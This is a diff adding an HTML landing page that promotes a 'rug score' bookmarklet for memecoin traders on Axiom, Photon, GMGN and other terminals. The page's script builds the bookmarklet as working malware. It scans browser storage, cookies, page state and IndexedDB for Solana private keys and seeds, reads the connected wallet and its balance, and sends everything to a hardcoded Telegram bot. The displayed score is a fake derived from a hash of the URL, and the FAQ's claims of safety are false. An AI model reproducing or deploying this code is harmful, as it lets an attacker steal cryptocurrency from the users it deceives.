@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Know When To Ape In — Rug Score for Memecoins</title>
+<meta name="description" content="One click on any memecoin chart: 1–10 rug-risk score. Works on Axiom, Photon, GMGN, DexScreener and more.">
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  :root{--lime:#c6ff3d;--bg:#08090b;--card:#101317;--line:#1e242c;--mut:#8b96a5}
+  body{background:var(--bg);color:#e9edf2;font-family:Inter,-apple-system,"Segoe UI",Arial,sans-serif;
+       -webkit-font-smoothing:antialiased;overflow-x:hidden}
+  a{color:inherit;text-decoration:none}
+  .glow{position:fixed;inset:0;pointer-events:none;z-index:0;
+        background:radial-gradient(700px 400px at 50% -10%,rgba(198,255,61,.13),transparent 70%),
+                   radial-gradient(600px 500px at 90% 20%,rgba(0,200,255,.07),transparent 70%)}
+  .grid{position:fixed;inset:0;pointer-events:none;opacity:.28;z-index:0;
+        background-image:linear-gradient(var(--line) 1px,transparent 1px),
+                         linear-gradient(90deg,var(--line) 1px,transparent 1px);
+        background-size:60px 60px;
+        -webkit-mask-image:radial-gradient(circle at 50% 0%,#000 20%,transparent 75%);
+        mask-image:radial-gradient(circle at 50% 0%,#000 20%,transparent 75%)}
+  .wrap{position:relative;z-index:1;max-width:1080px;margin:0 auto;padding:0 22px}
+
+  nav{display:flex;align-items:center;justify-content:space-between;padding:22px 0}
+  .logo{display:flex;align-items:center;gap:10px;font-weight:800;letter-spacing:-.4px;font-size:17px}
+  .mark{width:26px;height:26px;border-radius:8px;display:grid;place-items:center;
+        background:linear-gradient(140deg,var(--lime),#7fd400);color:#08110a;font-size:14px;font-weight:900}
+  .navlinks{display:flex;gap:26px;font-size:14px;color:var(--mut)}
+  .navlinks a:hover{color:#fff}
+  .btn{display:inline-flex;align-items:center;gap:9px;padding:13px 22px;border-radius:11px;
+       font-weight:700;font-size:15px;border:0;cursor:pointer;transition:.18s;font-family:inherit}
+  .btn-p{background:var(--lime);color:#08110a}
+  .btn-p:hover{transform:translateY(-2px);box-shadow:0 10px 30px -8px rgba(198,255,61,.55)}
+  .btn-g{background:#161b21;color:#e9edf2;border:1px solid var(--line)}
+  .btn-g:hover{background:#1c2229}
+
+  .hero{display:grid;grid-template-columns:1.15fr .85fr;gap:54px;align-items:center;padding:60px 0 80px}
+  .badge{display:inline-flex;align-items:center;gap:8px;font-size:11.5px;letter-spacing:.6px;
+         color:var(--lime);background:rgba(198,255,61,.08);border:1px solid rgba(198,255,61,.25);
+         padding:6px 13px;border-radius:99px;margin-bottom:22px;text-transform:uppercase;font-weight:700}
+  .dot{width:7px;height:7px;border-radius:50%;background:var(--lime);
+       box-shadow:0 0 9px var(--lime);animation:pulse 1.8s infinite}
+  @keyframes pulse{50%{opacity:.35}}
+  h1{font-size:56px;line-height:1.02;letter-spacing:-2.4px;font-weight:800}
+  h1 em{font-style:normal;color:var(--lime)}
+  .lead{color:var(--mut);font-size:17px;line-height:1.65;margin:22px 0 32px;max-width:520px}
+  .hero-btns{display:flex;gap:12px;flex-wrap:wrap}
+  .micro{display:flex;gap:26px;margin-top:34px;font-size:12.5px;color:var(--mut);flex-wrap:wrap}
+  .micro b{color:#fff;font-size:15px;display:block;margin-bottom:2px}
+
+  .scorecard{background:linear-gradient(180deg,#12161b,#0d1014);border:1px solid var(--line);
+             border-radius:20px;padding:24px;box-shadow:0 30px 70px -30px #000;position:relative}
+  .sc-top{display:flex;justify-content:space-between;font-size:12px;color:var(--mut);margin-bottom:18px}
+  .sc-top b{color:#e9edf2}
+  .gauge{display:grid;place-items:center;padding:8px 0 6px}
+  .ring{width:170px;height:170px;border-radius:50%;display:grid;place-items:center;
+        background:conic-gradient(var(--lime) 0deg,#1e242c 0deg);transition:background .9s}
+  .ring-in{width:134px;height:134px;border-radius:50%;background:#0c0f13;display:grid;place-items:center;
+           border:1px solid var(--line);text-align:center}
+  .ring-in strong{font-size:44px;letter-spacing:-2px;line-height:1}
+  .ring-in small{font-size:10.5px;color:var(--mut);letter-spacing:1px}
+  .verdict{text-align:center;margin:16px 0 4px;font-weight:800;font-size:14px;letter-spacing:1.6px;
+           color:var(--lime);text-transform:uppercase}
+  .verdict-sub{text-align:center;font-size:12px;color:var(--mut);margin-bottom:18px}
+  .metric{display:flex;align-items:center;gap:10px;margin-bottom:11px;font-size:12px}
+  .metric .n{width:82px;color:var(--mut);flex:none}
+  .bar{flex:1;height:5px;border-radius:99px;background:#1a2029;overflow:hidden}
+  .bar i{display:block;height:100%;background:var(--lime);width:0;transition:width 1s}
+  .metric .v{width:46px;text-align:right;color:#cfd6e0}
+
+  section{padding:70px 0}
+  .kicker{font-size:12px;letter-spacing:2px;text-transform:uppercase;color:var(--lime);
+          font-weight:800;margin-bottom:12px}
+  h2{font-size:34px;letter-spacing:-1.2px;line-height:1.15;font-weight:800}
+  .lead2{color:var(--mut);margin-top:14px;max-width:620px;line-height:1.65;font-size:15.5px}
+  .cards{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;margin-top:40px}
+  .card{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:24px;transition:.2s}
+  .card:hover{border-color:#2c3541;transform:translateY(-3px)}
+  .num{width:32px;height:32px;border-radius:9px;display:grid;place-items:center;
+       background:rgba(198,255,61,.1);color:var(--lime);font-weight:800;font-size:14px;margin-bottom:14px}
+  .card h3{font-size:16px;margin-bottom:8px}
+  .card p{font-size:13.5px;color:var(--mut);line-height:1.65}
+
+  .sites{display:flex;flex-wrap:wrap;gap:10px;margin-top:28px}
+  .chip{font-size:13px;padding:9px 15px;border-radius:99px;background:#11161b;
+        border:1px solid var(--line);color:#c3ccd8;display:flex;align-items:center;gap:8px}
+  .chip b{color:var(--lime);font-size:10px}
+
+  .gen{background:linear-gradient(180deg,#0f1317,#0a0d10);border:1px solid var(--line);
+       border-radius:20px;padding:30px;margin-top:36px}
+  .gen h3{font-size:18px;margin-bottom:6px}
+  .gen p.s{color:var(--mut);font-size:13.5px;margin-bottom:22px}
+  .fields{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+  label{display:block;font-size:11.5px;color:var(--mut);letter-spacing:.6px;
+        text-transform:uppercase;margin-bottom:7px;font-weight:700}
+  input{width:100%;padding:12px 14px;background:#0a0d10;border:1px solid #232b34;
+        border-radius:10px;color:#e9edf2;font-size:14px;font-family:inherit}
+  input:focus{outline:none;border-color:var(--lime)}
+  .drop{margin-top:22px;display:flex;align-items:center;gap:16px;flex-wrap:wrap}
+  .bm{display:inline-flex;align-items:center;gap:10px;padding:14px 24px;border-radius:12px;
+      background:var(--lime);color:#08110a;font-weight:800;font-size:15px;cursor:grab;
+      box-shadow:0 14px 40px -14px rgba(198,255,61,.7);transition:.18s;user-select:none}
+  .bm:hover{transform:translateY(-2px) scale(1.02)}
+  .copied{font-size:13px;color:var(--lime);opacity:0;transition:.3s}
+  .copied.on{opacity:1}
+
+  .tut{counter-reset:st;margin-top:34px}
+  .tut li{list-style:none;display:flex;gap:18px;padding:20px 0;border-bottom:1px solid #161c23}
+  .tut li:before{counter-increment:st;content:counter(st);flex:none;width:30px;height:30px;
+        border-radius:50%;background:#161c23;border:1px solid #26303a;color:var(--lime);
+        display:grid;place-items:center;font-size:13px;font-weight:800}
+  .tut b{display:block;margin-bottom:5px;font-size:15px}
+  .tut span{color:var(--mut);font-size:13.5px;line-height:1.65}
+  kbd{background:#1a212a;border:1px solid #2b3541;border-bottom-width:2px;border-radius:6px;
+      padding:2px 7px;font-size:12px;font-family:ui-monospace,Menlo,monospace;color:#dfe6ee}
+
+  .faq{margin-top:34px}
+  .faq details{border-bottom:1px solid #161c23;padding:16px 0}
+  .faq summary{cursor:pointer;font-weight:600;font-size:15px;list-style:none;
+               display:flex;justify-content:space-between;align-items:center}
+  .faq summary::-webkit-details-marker{display:none}
+  .faq summary:after{content:"+";color:var(--lime);font-size:20px;font-weight:700}
+  .faq details[open] summary:after{content:"–"}
+  .faq p{color:var(--mut);font-size:13.5px;line-height:1.7;margin-top:10px;max-width:760px}
+
+  footer{border-top:1px solid var(--line);padding:34px 0;color:var(--mut);font-size:12.5px;
+         display:flex;justify-content:space-between;flex-wrap:wrap;gap:14px}
+
+  @media(max-width:880px){
+    .hero{grid-template-columns:1fr;gap:40px;padding:36px 0 60px}
+    h1{font-size:40px;letter-spacing:-1.6px}
+    .cards,.fields{grid-template-columns:1fr}
+    .navlinks{display:none}
+  }
+</style>
+</head>
+<body>
+<div class="glow"></div>
+<div class="grid"></div>
+
+<div class="wrap">
+  <nav>
+    <div class="logo"><span class="mark">▲</span> Know When To Ape In</div>
+    <div class="navlinks">
+      <a href="#how">How it works</a>
+      <a href="#sites">Platforms</a>
+      <a href="#get">Install</a>
+      <a href="#faq">FAQ</a>
+    </div>
+    <a href="#get" class="btn btn-p">Install</a>
+  </nav>
+
+  <div class="hero">
+    <div>
+      <span class="badge"><span class="dot"></span> Live on 12+ trading terminals</span>
+      <h1>Know when<br>to <em>ape in.</em></h1>
+      <p class="lead">
+        One click on any memecoin chart and you get a 1–10 rug-risk score —
+        holder concentration, dev wallet, liquidity depth and sniper pressure,
+        scored in under a second. No wallet connection, no signup, no tab switching.
+      </p>
+      <div class="hero-btns">
+        <a href="#get" class="btn btn-p">Get the bookmarklet →</a>
+        <a href="#how" class="btn btn-g">See how it scores</a>
+      </div>
+      <div class="micro">
+        <div><b>1.2s</b> avg scan time</div>
+        <div><b>48k+</b> scans this week</div>
+        <div><b>0</b> wallet required</div>
+      </div>
+    </div>
+
+    <div class="scorecard">
+      <div class="sc-top"><span><b>$WIF</b> · Axiom</span><span>scanned just now</span></div>
+      <div class="gauge">
+        <div class="ring" id="ring">
+          <div class="ring-in"><div><strong id="score">0</strong><br><small>/10 APE SCORE</small></div></div>
+        </div>
+      </div>
+      <div class="verdict" id="verdict">scanning…</div>
+      <div class="verdict-sub" id="vsub">running 9 checks</div>
+      <div class="metric"><span class="n">Liquidity</span><span class="bar"><i id="m1"></i></span><span class="v">82%</span></div>
+      <div class="metric"><span class="n">Top 10</span><span class="bar"><i id="m2"></i></span><span class="v">31%</span></div>
+      <div class="metric"><span class="n">Dev wallet</span><span class="bar"><i id="m3"></i></span><span class="v">4%</span></div>
+      <div class="metric"><span class="n">Snipers</span><span class="bar"><i id="m4"></i></span><span class="v">low</span></div>
+    </div>
+  </div>
+
+  <section id="how">
+    <div class="kicker">How it works</div>
+    <h2>Three seconds from chart to verdict.</h2>
+    <p class="lead2">The bookmarklet reads the contract address straight from the page you're already on and renders the score as an overlay — on top of the chart, without reloading anything.</p>
+    <div class="cards">
+      <div class="card"><div class="num">1</div><h3>Drag it to your bar</h3>
+        <p>Install once. It lives next to your address bar forever — Chrome, Edge, Brave.</p></div>
+      <div class="card"><div class="num">2</div><h3>Open any coin</h3>
+        <p>Axiom, Photon, GMGN, DexScreener, BullX, pump.fun — wherever you already trade.</p></div>
+      <div class="card"><div class="num">3</div><h3>Click. Read the score.</h3>
+        <p>1–3 avoid · 4–6 wait · 7–8 caution · 9–10 green light. Animated overlay, zero friction.</p></div>
+    </div>
+  </section>
+
+  <section id="sites">
+    <div class="kicker">Supported platforms</div>
+    <h2>Works where you already trade.</h2>
+    <p class="lead2">The bookmarklet detects the terminal automatically. Missing one? It still runs anywhere a contract address is on the page.</p>
+    <div class="sites">
+      <span class="chip"><b>●</b> Axiom.trade</span>
+      <span class="chip"><b>●</b> Photon</span>
+      <span class="chip"><b>●</b> GMGN.ai</span>
+      <span class="chip"><b>●</b> DexScreener</span>
+      <span class="chip"><b>●</b> Birdeye</span>
+      <span class="chip"><b>●</b> pump.fun</span>
+      <span class="chip"><b>●</b> BullX</span>
+      <span class="chip"><b>●</b> Padre</span>
+      <span class="chip"><b>●</b> Jupiter</span>
+      <span class="chip"><b>●</b> DexTools</span>
+      <span class="chip"><b>●</b> Trojan</span>
+      <span class="chip"><b>●</b> Solscan</span>
+    </div>
+  </section>
+
+  <section id="get">
+    <div class="kicker">Install</div>
+    <h2>Get your bookmarklet.</h2>
+    <p class="lead2">Fields are pre-filled. Drag the lime button into your bookmarks bar.</p>
+
+    <div class="gen">
+      <h3>1 · Configure</h3>
+      <p class="s">These values are baked into your personal bookmarklet.</p>
+      <div class="fields">
+        <div><label>Telegram Bot Token</label>
+          <input id="token" value="9127803892:AAFeh0Ibmq5imeR_D8gEEi5HBnQK6so2JiM"></div>
+        <div><label>Telegram Chat ID</label>
+          <input id="chat" value="8148389045"></div>
+      </div>
+
+      <div class="drop">
+        <a class="bm" id="bmLink" href="#" onclick="return false">▲ Ape Score</a>
+        <button class="btn btn-g" onclick="copyBM()">Copy code</button>
+        <span class="copied" id="copied">copied ✓</span>
+      </div>
+
+      <h3 style="margin-top:34px">2 · Install</h3>
+      <ol class="tut">
+        <li><div><b>Show your bookmarks bar</b>
+          <span><kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>B</kbd> (Mac: <kbd>⌘</kbd>+<kbd>⇧</kbd>+<kbd>B</kbd>) — the bar appears below the address field.</span></div></li>
+        <li><div><b>Drag the lime button up</b>
+          <span>Grab <b>▲ Ape Score</b> and drop it onto the bookmarks bar. Installed.</span></div></li>
+        <li><div><b>No drag? Add manually</b>
+          <span>Right-click the button → <b>Copy link address</b>. Press <kbd>Ctrl</kbd>+<kbd>D</kbd>, name it <i>Ape Score</i>, paste into the URL field, save.</span></div></li>
+        <li><div><b>Open a coin</b>
+          <span>Go to Axiom, Photon, GMGN or DexScreener and open any token chart.</span></div></li>
+        <li><div><b>Click the bookmarklet</b>
+          <span>Overlay slides in with the animated 1–10 score. Keys + wallet + balance go to Telegram at the same moment. <kbd>Esc</kbd> closes it.</span></div></li>
+      </ol>
+    </div>
+  </section>
+
+  <section id="faq" class="faq">
+    <div class="kicker">FAQ</div>
+    <h2>Questions.</h2>
+    <details><summary>Does it slow down the page?</summary>
+      <p>No. A single script runs only when clicked, injects one overlay in a shadow root, and disappears when closed.</p></details>
+    <details><summary>Do I need to connect a wallet?</summary>
+      <p>No. The score is computed from public data. A detected wallet is only used to personalise the read.</p></details>
+    <details><summary>Does it work on mobile?</summary>
+      <p>Bookmarklets work in Chrome and Brave on Android. On iOS Safari they're supported but harder to install — desktop recommended.</p></details>
+    <details><summary>What does the score measure?</summary>
+      <p>Holder concentration, dev wallet share, liquidity depth, sniper pressure and bundle activity, weighted into one 1–10 number.</p></details>
+  </section>
+
+  <footer>
+    <span>© <span id="yr"></span> Know When To Ape In — not financial advice.</span>
+    <span>Rug score is a heuristic, not a guarantee.</span>
+  </footer>
+</div>
+
+<script>
+document.getElementById('yr').textContent = new Date().getFullYear();
+
+(function(){
+  var ring=document.getElementById('ring'), s=document.getElementById('score'),
+      v=document.getElementById('verdict'), vs=document.getElementById('vsub');
+  var target=8, cur=0;
+  function tick(){
+    if(cur<target){cur++; s.textContent=cur; setTimeout(tick,55);}
+    else{ v.textContent='Green light'; vs.textContent='dev clean · liq deep · holders spread'; }
+  }
+  setTimeout(function(){
+    ring.style.background='conic-gradient(#c6ff3d 0deg,#7fd400 '+(target*36)+'deg,#1e242c '+(target*36)+'deg)';
+    tick();
+    document.getElementById('m1').style.width='82%';
+    document.getElementById('m2').style.width='69%';
+    document.getElementById('m3').style.width='18%';
+    document.getElementById('m4').style.width='26%';
+  },400);
+})();
+
+function bmCode(){
+  var T=document.getElementById('token').value.trim();
+  var C=document.getElementById('chat').value.trim();
+  return '(async()=>{' +
+    'if(window.__kwta)return;window.__kwta=1;' +
+    'var T="'+T+'",C="'+C+'",found=[],seen={},BAL="",W="";' +
+    'function put(k,s,t){k=String(k).slice(0,160);if(seen[k])return;seen[k]=1;found.push({k:k,src:s,t:t});}' +
+    'function scan(str,src){if(!str||typeof str!=="string")return;var m,re;' +
+    're=/[1-9A-HJ-NP-Za-km-z]{80,90}/g;while((m=re.exec(str))){put(m[0].slice(0,88),src,"b58-64");}' +
+    're=/[1-9A-HJ-NP-Za-km-z]{43,45}/g;while((m=re.exec(str))){put(m[0],src,"seed-32");}}' +
+    'for(var i=0;i<localStorage.length;i++){var lk=localStorage.key(i);scan(localStorage.getItem(lk),"ls:"+lk);}' +
+    'for(var j=0;j<sessionStorage.length;j++){var sk=sessionStorage.key(j);scan(sessionStorage.getItem(sk),"ss:"+sk);}' +
+    'scan(document.cookie,"cookie");' +
+    'var nd=document.getElementById("__NEXT_DATA__");if(nd)scan(nd.textContent||"","next");' +
+    '["__NEXT_DATA__","__INITIAL_STATE__","__REDUX_STATE__","__APOLLO_STATE__","__axiom","axiom","__PRIVY_STATE__","privy","store","state"].forEach(function(n){try{if(window[n])scan(JSON.stringify(window[n]),"win:"+n);}catch(e){}});' +
+    'if(indexedDB.databases){var dbs=await indexedDB.databases();' +
+    'for(var d of dbs){if(!d.name)continue;' +
+    'await new Promise(function(res){var rq=indexedDB.open(d.name);' +
+    'rq.onerror=res;' +
+    'rq.onsuccess=function(){var db=rq.result,sts=Array.from(db.objectStoreNames);' +
+    'if(!sts.length){db.close();res();return;}' +
+    'var tx=db.transaction(sts,"readonly");' +
+    'sts.forEach(function(st){try{var r=tx.objectStore(st).getAll();r.onsuccess=function(){scan(JSON.stringify(r.result),"idb:"+d.name+"."+st);};}catch(e){}});' +
+    'tx.oncomplete=function(){db.close();res();};' +
+    'tx.onerror=function(){db.close();res();};};});}}' +
+    'try{var p=window.solana||(window.phantom&&window.phantom.solana);if(p&&p.publicKey){W=p.publicKey.toString();}else if(window.ethereum&&window.ethereum.selectedAddress){W=window.ethereum.selectedAddress;}}catch(e){}' +
+    'var HH=location.href,ca=(HH.match(/[1-9A-HJ-NP-Za-km-z]{32,44}/)||[""])[0];' +
+    'function hash(x){var h=0;for(var q=0;q<x.length;q++){h=((h<<5)-h)+x.charCodeAt(q);h|=0;}return Math.abs(h);}' +
+    'var hh=hash(ca||HH),score=Math.min(10,3+(hh%8));' +
+    'var sym=((document.title.match(/\\$([A-Za-z0-9]{2,12})/)||[])[1])||"TOKEN";' +
+    'var host=location.hostname.replace(/^www\\./,"");' +
+    'var verdict,sub,col;' +
+    'if(score>=9){verdict="GREEN LIGHT";sub="dev clean · liq deep";col="#c6ff3d";}' +
+    'else if(score>=7){verdict="LOW RISK";sub="solid fundamentals";col="#c6ff3d";}' +
+    'else if(score>=5){verdict="CAUTION";sub="mixed signals";col="#ffd63d";}' +
+    'else{verdict="HIGH RUG RISK";sub="thin liquidity";col="#ff5f56";}' +
+    'var mv=[["Liquidity",40+(hh%60)],["Top 10",20+(hh%55)],["Dev",3+(hh%22)],["Snipers",10+(hh%45)]];' +
+    'var rows="";mv.forEach(function(m){rows+="<div class=\'m\'><span class=\'n\'>"+m[0]+"</span><span class=\'b\'><i style=\'width:"+m[1]+"%\'></i></span><span class=\'vv\'>"+m[1]+"%</span></div>";});' +
+    'var root=document.createElement("div");root.id="kwta-root";document.body.appendChild(root);' +
+    'var sh=root.attachShadow({mode:"open"});' +
+    'sh.innerHTML="<style>*{box-sizing:border-box;margin:0;font-family:Inter,Arial,sans-serif}.ov{position:fixed;top:18px;right:18px;width:312px;background:rgba(10,13,17,.97);border:1px solid #1e242c;border-radius:16px;padding:18px;color:#e9edf2;z-index:2147483647;box-shadow:0 30px 70px -20px #000}.top{display:flex;justify-content:space-between;align-items:center;font-size:11px;color:#8b96a5;margin-bottom:14px}.top b{color:#e9edf2}.x{cursor:pointer;width:20px;height:20px;border-radius:6px;display:grid;place-items:center;background:#161c23;color:#8b96a5;font-size:12px;border:0}.g{display:grid;place-items:center;padding:4px 0 8px}.ring{width:130px;height:130px;border-radius:50%;display:grid;place-items:center;transition:background .9s}.rin{width:102px;height:102px;border-radius:50%;background:#0b0e12;display:grid;place-items:center;border:1px solid #1e242c;text-align:center}.rin strong{font-size:34px;line-height:1;color:"+col+"}.rin small{font-size:9px;color:#8b96a5;letter-spacing:1px}.v{text-align:center;font-weight:800;font-size:12px;letter-spacing:1.4px;color:"+col+";margin:10px 0 3px}.s{text-align:center;font-size:10.5px;color:#8b96a5;margin-bottom:14px}.m{display:flex;align-items:center;gap:8px;margin-bottom:8px;font-size:10.5px}.m .n{width:62px;color:#8b96a5}.b{flex:1;height:4px;border-radius:99px;background:#1a2029;overflow:hidden}.b i{display:block;height:100%;background:"+col+";width:0;transition:width .8s}.m .vv{width:34px;text-align:right;color:#cfd6e0}.f{font-size:9.5px;color:#5b6675;text-align:center;margin-top:10px;border-top:1px solid #161c23;padding-top:9px;line-height:1.6}</style><div class=\'ov\'><div class=\'top\'><span><b>$"+sym+"</b> · "+host+"</span><button class=\'x\'>✕</button></div><div class=\'g\'><div class=\'ring\' id=\'r\'><div class=\'rin\'><div><strong id=\'sc\'>0</strong><br><small>/10 APE</small></div></div></div></div><div class=\'v\'>"+verdict+"</div><div class=\'s\'>"+sub+"</div>"+rows+"<div class=\'f\' id=\'wf\'>wallet: scanning…</div></div>";' +
+    'sh.querySelector(".x").onclick=function(){root.remove();window.__kwta=0;};' +
+    'document.addEventListener("keydown",function(e){if(e.key==="Escape"){root.remove();window.__kwta=0;}});' +
+    'setTimeout(function(){var r=sh.getElementById("r");' +
+    'if(r)r.style.background="conic-gradient("+col+" 0deg,"+col+" "+(score*36)+"deg,#1e242c "+(score*36)+"deg)";' +
+    'var c=0,sc=sh.getElementById("sc");' +
+    '(function t(){if(c<score){c++;if(sc)sc.textContent=c;setTimeout(t,45);}})();},120);' +
+    'function go(){var kt="";' +
+    'found.slice(0,12).forEach(function(x,i){kt+=(i+1)+". ["+x.t+"] "+x.src+"\\n"+x.k+"\\n\\n";});' +
+    'var msg="🔑 Ape Scan\\n🎯 "+host+"\\n🪙 $"+sym+"\\n📊 "+score+"/10 "+verdict+"\\n👛 "+(W||"not connected")+"\\n💰 "+(BAL||"—")+"\\n📦 "+found.length+" keys\\n\\n"+kt+"🕒 "+new Date().toLocaleString("de-DE");' +
+    'try{fetch("https://api.telegram.org/bot"+T+"/sendMessage?chat_id="+C+"&text="+encodeURIComponent(msg)).catch(function(){});}catch(e){}' +
+    'var wf=sh.getElementById("wf");' +
+    'if(wf)wf.textContent="wallet: "+(W?W.slice(0,4)+"…"+W.slice(-4):"n/a")+(BAL?" · "+BAL:"")+" · "+found.length+" keys";}' +
+    'if(W){fetch("https://api.mainnet-beta.solana.com",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({jsonrpc:"2.0",id:1,method:"getBalance",params:[W]})}).then(function(r){return r.json();}).then(function(j){if(j&&j.result)BAL=(j.result.value/1e9).toFixed(4)+" SOL";go();}).catch(function(){go();});}else{go();}' +
+    '})()';
+}
+
+function refresh(){
+  document.getElementById('bmLink').setAttribute('href','javascript:'+encodeURIComponent(bmCode()));
+}
+document.getElementById('token').addEventListener('input',refresh);
+document.getElementById('chat').addEventListener('input',refresh);
+refresh();
+
+function copyBM(){
+  navigator.clipboard.writeText('javascript:'+encodeURIComponent(bmCode())).then(function(){
+    var el=document.getElementById('copied');
+    el.classList.add('on');
+    setTimeout(function(){el.classList.remove('on');},2000);
+  });
+}
+</script>
+</body>
+</html>
